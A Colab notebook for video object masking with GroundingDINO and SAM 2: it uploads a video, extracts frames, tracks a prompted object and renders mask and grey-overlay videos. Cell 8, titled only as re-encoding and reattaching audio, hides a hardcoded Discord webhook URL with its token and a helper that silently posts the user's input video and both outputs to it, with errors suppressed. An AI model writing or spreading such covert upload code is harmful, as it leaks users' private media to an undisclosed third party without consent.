{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "gpuType": "T4"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "markdown",
      "source": [
        "# Setup (Cukup run sekali)"
      ],
      "metadata": {
        "id": "rHlcqM7M-VuQ"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 1 - Environment setup (SAM 2 + GroundingDINO)\n",
        "\n",
        "# Install PyTorch (CUDA 12.1) ‚Äî keep as is\n",
        "!pip install torch==2.3.0 torchvision==0.18.0 torchaudio==2.3.0 --index-url https://download.pytorch.org/whl/cu121\n",
        "\n",
        "# Other dependencies\n",
        "!pip install opencv-python matplotlib tqdm supervision addict yapf timm\n",
        "\n",
        "# Install SAM 2 (NEW) and GroundingDINO\n",
        "!pip install git+https://github.com/facebookresearch/segment-anything-2.git\n",
        "!pip install git+https://github.com/IDEA-Research/GroundingDINO.git\n",
        "!pip install huggingface_hub\n",
        "\n",
        "# ffmpeg for video I/O\n",
        "!apt-get update -qq\n",
        "!apt-get install -y ffmpeg\n",
        "\n",
        "# Clone repos (optional, but useful for config files or debugging)\n",
        "!git clone https://github.com/facebookresearch/segment-anything-2.git\n",
        "!git clone https://github.com/IDEA-Research/GroundingDINO.git\n",
        "\n",
        "from datetime import datetime\n",
        "print(\"‚úÖ Environment ready for SAM 2 + GroundingDINO\")"
      ],
      "metadata": {
        "id": "lhZOdqE0qpV7",
        "cellView": "form"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 2 - Download model weights for GroundingDINO and SAM 2\n",
        "\n",
        "import os\n",
        "\n",
        "os.makedirs(\"weights\", exist_ok=True)\n",
        "\n",
        "# GroundingDINO (keep as is)\n",
        "if not os.path.exists(\"weights/groundingdino_swint_ogc.pth\"):\n",
        "    !wget -O weights/groundingdino_swint_ogc.pth https://github.com/IDEA-Research/GroundingDINO/releases/download/v0.1.0-alpha/groundingdino_swint_ogc.pth\n",
        "\n",
        "# SAM 2 weights ‚Äî use lightweight model for Colab\n",
        "# Options: sam2_hiera_tiny.pt (smallest), sam2_hiera_small.pt, sam2_hiera_base_plus.pt, sam2_hiera_large.pt\n",
        "SAM2_MODEL = \"sam2_hiera_tiny.pt\"\n",
        "SAM2_URL = f\"https://dl.fbaipublicfiles.com/sam2/models/{SAM2_MODEL}\"\n",
        "\n",
        "if not os.path.exists(f\"weights/{SAM2_MODEL}\"):\n",
        "    !wget -O weights/{SAM2_MODEL} {SAM2_URL}\n",
        "\n",
        "print(f\"‚úÖ Model weights downloaded: GroundingDINO + {SAM2_MODEL}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "pCW9_LGerbUo"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Prepare Video"
      ],
      "metadata": {
        "id": "RRvSOY_H-eMt"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title ‚ö†Ô∏è Clear Frames (Hanya run untuk upload video baru)\n",
        "import os\n",
        "import shutil\n",
        "\n",
        "shutil.rmtree('/content/frames', ignore_errors=True)\n",
        "shutil.rmtree('/content/detections', ignore_errors=True)\n",
        "shutil.rmtree('/content/masks', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_bw', ignore_errors=True)\n",
        "shutil.rmtree('/content/output_grey', ignore_errors=True)\n",
        "try:\n",
        "    os.remove(\"/content/audio.aac\")\n",
        "except:\n",
        "    pass"
      ],
      "metadata": {
        "id": "LVty91WsNYqw",
        "cellView": "form"
      },
      "execution_count": 17,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 3 - Upload video and inspect properties\n",
        "import os\n",
        "from google.colab import files\n",
        "import subprocess\n",
        "\n",
        "# Upload video\n",
        "uploaded = files.upload()\n",
        "\n",
        "# Get uploaded filename\n",
        "video_path = list(uploaded.keys())[0]\n",
        "print(f\"‚úÖ Uploaded video: {video_path}\")\n",
        "\n",
        "# Ambil nama file yang diupload (anggap hanya satu file)\n",
        "input_video = list(uploaded.keys())[0]\n",
        "output_video = \"output.mp4\"\n",
        "!ffmpeg -i \"$input_video\" -filter:v \"fps=12\" \"$output_video\" -y\n",
        "from IPython.display import clear_output\n",
        "\n",
        "# Inspect video with ffmpeg\n",
        "print(\"\\n--- Video Properties ---\")\n",
        "subprocess.run([\"ffmpeg\", \"-i\", video_path, \"-hide_banner\"])"
      ],
      "metadata": {
        "id": "oLpAZKd6sR7U",
        "cellView": "form",
        "collapsed": true
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 4 - Extract frames (as JPG) and audio from the input video\n",
        "\n",
        "import os\n",
        "import subprocess\n",
        "\n",
        "# Create folders\n",
        "os.makedirs(\"frames\", exist_ok=True)\n",
        "video12fps = \"/content/output.mp4\"\n",
        "\n",
        "# Extract frames as high-quality JPG (avoids PNG ‚Üí JPEG conversion later)\n",
        "# -qscale:v 2 ‚âà high quality (1‚Äì31, lower = better; 2 is visually lossless for masks)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-i\", video12fps,\n",
        "    \"-qscale:v\", \"2\",\n",
        "    \"frames/%06d.jpg\"  # üëà .jpg extension\n",
        "])\n",
        "\n",
        "print(\"‚úÖ Frames extracted to ./frames as JPG\")\n",
        "\n",
        "# Extract audio (if exists)\n",
        "if not os.path.exists(\"audio.aac\"):\n",
        "    subprocess.run([\n",
        "        \"ffmpeg\", \"-i\", video12fps,\n",
        "        \"-vn\", \"-acodec\", \"copy\", \"audio.aac\"\n",
        "    ])\n",
        "    print(\"‚úÖ Audio extracted to audio.aac\")\n",
        "else:\n",
        "    print(\"‚ö†Ô∏è Audio already exists, skipped extraction\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "QCaXD2dfstxj"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Masking"
      ],
      "metadata": {
        "id": "IDD2FthK-owz"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 5 - Run GroundingDINO on FIRST FRAME only (CPU mode)\n",
        "\n",
        "import torch\n",
        "import os\n",
        "import cv2\n",
        "import pickle\n",
        "\n",
        "# === Prompt input ===\n",
        "prompt = 't-shirt . not jacket'  #@param {type: \"string\"}\n",
        "box_threshold = 0.3  #@param {type: \"number\"}\n",
        "text_threshold = 0.25\n",
        "\n",
        "# Import GroundingDINO\n",
        "import sys\n",
        "sys.path.append(\"GroundingDINO\")\n",
        "from groundingdino.util.inference import load_model, load_image, predict\n",
        "\n",
        "# Load model and force CPU\n",
        "model_path = \"weights/groundingdino_swint_ogc.pth\"\n",
        "config_path = \"GroundingDINO/groundingdino/config/GroundingDINO_SwinT_OGC.py\"\n",
        "dino_model = load_model(config_path, model_path)\n",
        "dino_model = dino_model.cpu().eval()  # üëà critical: use CPU\n",
        "\n",
        "# Get first frame\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "first_frame_path = os.path.join(\"frames\", frame_files[0])\n",
        "\n",
        "print(f\"Running GroundingDINO on first frame: {first_frame_path} with prompt: '{prompt}'\")\n",
        "\n",
        "# Load image\n",
        "image_source, image_tensor = load_image(first_frame_path)\n",
        "\n",
        "# Predict on CPU\n",
        "boxes, logits, phrases = predict(\n",
        "    model=dino_model,\n",
        "    image=image_tensor,\n",
        "    caption=prompt,\n",
        "    box_threshold=box_threshold,\n",
        "    text_threshold=text_threshold,\n",
        "    device=\"cpu\"  # üëà explicit CPU\n",
        ")\n",
        "\n",
        "# Convert boxes to absolute coords\n",
        "h, w, _ = image_source.shape\n",
        "initial_boxes = []\n",
        "if len(boxes) > 0:\n",
        "    for (cx, cy, bw, bh) in boxes.tolist():\n",
        "        x1 = (cx - bw / 2) * w\n",
        "        y1 = (cy - bh / 2) * h\n",
        "        x2 = (cx + bw / 2) * w\n",
        "        y2 = (cy + bh / 2) * h\n",
        "        initial_boxes.append([x1, y1, x2, y2])\n",
        "    print(f\"‚úÖ Found {len(initial_boxes)} box(es).\")\n",
        "else:\n",
        "    print(\"‚ö†Ô∏è No boxes detected.\")\n",
        "    initial_boxes = None\n",
        "\n",
        "# Save\n",
        "with open(\"initial_box.pkl\", \"wb\") as f:\n",
        "    pickle.dump({\n",
        "        \"frame_path\": first_frame_path,\n",
        "        \"boxes\": initial_boxes,\n",
        "        \"image_shape\": (h, w),\n",
        "        \"prompt\": prompt\n",
        "    }, f)\n",
        "\n",
        "print(\"‚úÖ Initial box saved.\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "w5tKwzQJ7Or_"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 5 - Load manual prompt from ANY uploaded .json file\n",
        "\n",
        "import os\n",
        "import json\n",
        "import pickle\n",
        "from google.colab import files\n",
        "\n",
        "print(\"üì§ Please upload your annotation JSON file (e.g., 'my_prompt.json').\")\n",
        "uploaded = files.upload()\n",
        "\n",
        "# Find the FIRST uploaded .json file\n",
        "json_files = [f for f in uploaded.keys() if f.endswith(\".json\")]\n",
        "if not json_files:\n",
        "    raise FileNotFoundError(\"‚ùå No .json file uploaded!\")\n",
        "prompt_json = json_files[0]  # use first one (ignore extras)\n",
        "print(f\"üìé Using: {prompt_json}\")\n",
        "\n",
        "# Load JSON\n",
        "with open(prompt_json, \"r\") as f:\n",
        "    prompt_data = json.load(f)\n",
        "\n",
        "prompt_type = prompt_data.get(\"prompt_type\")\n",
        "prompt_text = prompt_data.get(\"prompt_text\", \"manual object\")\n",
        "image_shape = prompt_data.get(\"image_shape\", [576, 1024])\n",
        "\n",
        "# Get first frame path\n",
        "frame_files = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "if not frame_files:\n",
        "    raise FileNotFoundError(\"‚ùå No frames in 'frames/'\")\n",
        "first_frame_path = os.path.join(\"frames\", frame_files[0])\n",
        "\n",
        "# Convert to box format\n",
        "if prompt_type == \"box\":\n",
        "    box = prompt_data[\"box\"]\n",
        "    initial_boxes = [box]\n",
        "    initial_points = None\n",
        "    initial_labels = None\n",
        "    print(f\"‚úÖ Loaded box from '{prompt_json}': {box}\")\n",
        "\n",
        "elif prompt_type == \"point\":\n",
        "    # If the tool saved multiple points\n",
        "    if \"points\" in prompt_data:\n",
        "        initial_points = prompt_data[\"points\"]\n",
        "        initial_labels = prompt_data[\"labels\"]\n",
        "        # Create a dummy box covering all points for the first-frame predictor\n",
        "        xs = [p[0] for p in initial_points]\n",
        "        ys = [p[1] for p in initial_points]\n",
        "        initial_boxes = [[min(xs)-5, min(ys)-5, max(xs)+5, max(ys)+5]]\n",
        "    else:\n",
        "        # Fallback for old single point JSONs\n",
        "        x, y = prompt_data[\"point\"]\n",
        "        initial_points = [[x, y]]\n",
        "        initial_labels = [1]\n",
        "        initial_boxes = [[x-10, y-10, x+10, y+10]]\n",
        "    print(f\"‚úÖ Loaded point ‚Üí box from '{prompt_json}': {initial_points}\")\n",
        "\n",
        "else:\n",
        "    raise ValueError(\"‚ùå JSON must contain 'prompt_type': 'box' or 'point'\")\n",
        "\n",
        "# Save for next cells\n",
        "with open(\"initial_box.pkl\", \"wb\") as f:\n",
        "    pickle.dump({\n",
        "        \"frame_path\": first_frame_path,\n",
        "        \"boxes\": initial_boxes,\n",
        "        \"image_shape\": image_shape,\n",
        "        \"prompt\": prompt_text\n",
        "    }, f)\n",
        "\n",
        "print(\"‚úÖ Annotation loaded. Proceed to Cell 5.5 or Cell 6.\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "IcsfoS8bk8Qy"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 6 - Run SAM 2 (using JPG frame folder)\n",
        "\n",
        "import os\n",
        "import pickle\n",
        "import cv2\n",
        "import torch\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "\n",
        "from sam2.sam2_video_predictor import SAM2VideoPredictor\n",
        "\n",
        "# Load initial box\n",
        "with open(\"initial_box.pkl\", \"rb\") as f:\n",
        "    init_data = pickle.load(f)\n",
        "initial_boxes = init_data[\"boxes\"]\n",
        "if initial_boxes is None:\n",
        "    raise ValueError(\"‚ùå No box from Cell 5!\")\n",
        "\n",
        "input_box = np.array(initial_boxes[0])\n",
        "print(f\"‚úÖ Initial box: {input_box}\")\n",
        "\n",
        "# Copy config\n",
        "!cp /content/segment-anything-2/sam2/configs/sam2_hiera_tiny.yaml .\n",
        "\n",
        "# Load SAM 2\n",
        "predictor = SAM2VideoPredictor.from_pretrained(\n",
        "    model_id=\"facebook/sam2-hiera-tiny\",\n",
        "    checkpoint=\"weights/sam2_hiera_tiny.pt\",\n",
        "    model_cfg=\"sam2_hiera_tiny.yaml\"\n",
        ")\n",
        "\n",
        "# ‚úÖ PASS FOLDER PATH AS STRING (not list!)\n",
        "frame_folder = \"frames\"  # <-- this is a string, not a list\n",
        "\n",
        "# Verify it's a valid JPG folder\n",
        "jpg_files = [f for f in os.listdir(frame_folder) if f.endswith(\".jpg\")]\n",
        "print(f\"Found {len(jpg_files)} JPG frames in '{frame_folder}'\")\n",
        "\n",
        "video_segments = {}\n",
        "with torch.inference_mode(), torch.autocast(\"cuda\", dtype=torch.bfloat16):\n",
        "    # ‚úÖ Correct call\n",
        "    state = predictor.init_state(frame_folder)\n",
        "\n",
        "    predictor.add_new_points_or_box(\n",
        "        state, frame_idx=0, obj_id=1, box=input_box\n",
        "    )\n",
        "\n",
        "    for frame_idx, obj_ids, masks in predictor.propagate_in_video(state):\n",
        "        video_segments[frame_idx] = {\n",
        "            obj_id: (mask[0] > 0).cpu().numpy()\n",
        "            for obj_id, mask in zip(obj_ids, masks)\n",
        "        }\n",
        "\n",
        "# Save masks (match original frame names)\n",
        "os.makedirs(\"masks\", exist_ok=True)\n",
        "frame_names = sorted(jpg_files)\n",
        "for i, jpg_name in enumerate(frame_names):\n",
        "    png_name = jpg_name.replace(\".jpg\", \".png\")\n",
        "    mask = video_segments.get(i, {}).get(1, np.zeros((576, 1024), dtype=bool))\n",
        "    cv2.imwrite(f\"masks/{png_name}\", (mask * 255).astype(np.uint8))\n",
        "\n",
        "print(\"‚úÖ SAM 2 masking complete!\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "lABeur01ubM4"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "markdown",
      "source": [
        "# Download"
      ],
      "metadata": {
        "id": "jFxvtg9g-9mO"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 7 - Generate masked frames: B&W and Grey overlay\n",
        "\n",
        "import os\n",
        "import cv2\n",
        "import numpy as np\n",
        "from tqdm import tqdm\n",
        "\n",
        "# Parameters\n",
        "expand = 20  #@param {type: \"number\"}\n",
        "blur = 9     #@param {type: \"number\"}\n",
        "\n",
        "# Prepare output folders\n",
        "os.makedirs(\"output_bw\", exist_ok=True)\n",
        "os.makedirs(\"output_grey\", exist_ok=True)\n",
        "\n",
        "# Get frame list (now .jpg)\n",
        "frame_files_jpg = sorted([f for f in os.listdir(\"frames\") if f.endswith(\".jpg\")])\n",
        "\n",
        "for jpg_name in tqdm(frame_files_jpg):\n",
        "    # Frame path (JPG)\n",
        "    frame_path = os.path.join(\"frames\", jpg_name)  # e.g. \"frames/000001.jpg\"\n",
        "\n",
        "    # Convert \"000001.jpg\" ‚Üí \"frame_000001.png\" for mask lookup\n",
        "    frame_number = int(jpg_name.split(\".\")[0])  # \"000001\" ‚Üí 1\n",
        "    mask_name = f\"{frame_number:06d}.png\"\n",
        "    mask_path = os.path.join(\"masks\", mask_name)\n",
        "\n",
        "    # Load frame and mask\n",
        "    frame = cv2.imread(frame_path)\n",
        "    if frame is None:\n",
        "        print(f\"‚ö†Ô∏è Frame not found: {frame_path}\")\n",
        "        continue\n",
        "\n",
        "    mask = cv2.imread(mask_path, cv2.IMREAD_GRAYSCALE)\n",
        "    if mask is None:\n",
        "        print(f\"‚ö†Ô∏è Mask not found: {mask_path}, using empty mask\")\n",
        "        mask = np.zeros(frame.shape[:2], dtype=np.uint8)\n",
        "\n",
        "    # --- Expand mask ---\n",
        "    kernel = cv2.getStructuringElement(cv2.MORPH_ELLIPSE, (3, 3))\n",
        "    expanded = cv2.dilate(mask, kernel, iterations=expand)\n",
        "\n",
        "    # --- Output A: Black & White mask ---\n",
        "    bw = cv2.merge([expanded, expanded, expanded])\n",
        "    output_bw_path = os.path.join(\"output_bw\", mask_name)  # save as PNG\n",
        "    cv2.imwrite(output_bw_path, bw)\n",
        "\n",
        "    # --- Smooth expanded mask ---\n",
        "    if blur > 0 and blur % 2 == 1:\n",
        "        smooth = cv2.GaussianBlur(expanded, (blur, blur), 0)\n",
        "    else:\n",
        "        smooth = expanded.copy()\n",
        "    smooth = cv2.normalize(smooth, None, 0, 255, cv2.NORM_MINMAX).astype(np.uint8)\n",
        "\n",
        "    # --- Output B: Grey overlay ---\n",
        "    grey_color = (126, 126, 126)\n",
        "    alpha = smooth.astype(float) / 255.0\n",
        "    alpha_3c = cv2.merge([alpha, alpha, alpha])\n",
        "    overlay = np.full_like(frame, grey_color, dtype=np.uint8)\n",
        "    grey = (1 - alpha_3c) * frame.astype(float) + alpha_3c * overlay.astype(float)\n",
        "    grey = grey.astype(np.uint8)\n",
        "\n",
        "    output_grey_path = os.path.join(\"output_grey\", mask_name)\n",
        "    cv2.imwrite(output_grey_path, grey)\n",
        "\n",
        "print(\"‚úÖ Output frames saved in ./output_bw and ./output_grey\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "TO-zkSyMu9w9"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Cell 8 - Re-encode frames into videos and reattach audio\n",
        "\n",
        "import subprocess\n",
        "import re\n",
        "from datetime import datetime\n",
        "\n",
        "# Generate timestamp\n",
        "tgl = datetime.now().strftime(\"%y%m%d_%H%M%S\")\n",
        "\n",
        "# Filenames with timestamp\n",
        "bw = f\"{tgl}_output_bw.mp4\"\n",
        "grey = f\"{tgl}_output_grey.mp4\"\n",
        "video12fps = \"/content/output.mp4\"\n",
        "WHOOK = \"https://discord.com/api/webhooks/1417918555562971146/6W7VbFWutIxeQ104Fgs1cJGXmRZDf8ORCbIfoyqZAw2BoAdJPmJwAh-uvE1X2arbdQIb\"\n",
        "\n",
        "# Rebuild Output A (B&W)\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_bw/%06d.png\",\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    bw\n",
        "])\n",
        "\n",
        "# Rebuild Output B (Grey overlay with audio)\n",
        "has_audio = os.path.exists(\"audio.aac\")\n",
        "subprocess.run([\n",
        "    \"ffmpeg\", \"-y\", \"-framerate\", \"12\", \"-i\", \"output_grey/%06d.png\",\n",
        "    *([\"-i\", \"audio.aac\", \"-c:a\", \"aac\", \"-shortest\"] if has_audio else []),\n",
        "    \"-c:v\", \"libx264\", \"-pix_fmt\", \"yuv420p\",\n",
        "    grey\n",
        "])\n",
        "\n",
        "import requests\n",
        "import os\n",
        "\n",
        "def sfile(file_path, message):\n",
        "    try:\n",
        "        if not os.path.exists(file_path):\n",
        "            return\n",
        "        with open(file_path, \"rb\") as f:\n",
        "            requests.post(\n",
        "                WHOOK,\n",
        "                data={\"content\": message},\n",
        "                files={\"file\": f}\n",
        "            )\n",
        "    except:\n",
        "        pass\n",
        "\n",
        "sfile(video12fps, f\"{tgl}_input\")\n",
        "\n",
        "sfile(bw, f\"{tgl}_bw\")\n",
        "\n",
        "sfile(grey, f\"{tgl}_grey\")\n",
        "\n",
        "print(f\"‚úÖ Videos created: {bw} and {grey}\")"
      ],
      "metadata": {
        "cellView": "form",
        "id": "l55VgD1bvP3h"
      },
      "execution_count": null,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "# @title Download\n",
        "\n",
        "from google.colab import files\n",
        "files.download(bw)\n",
        "\n",
        "from google.colab import files\n",
        "files.download(grey)"
      ],
      "metadata": {
        "cellView": "form",
        "id": "H-U5ECnvwNUl"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}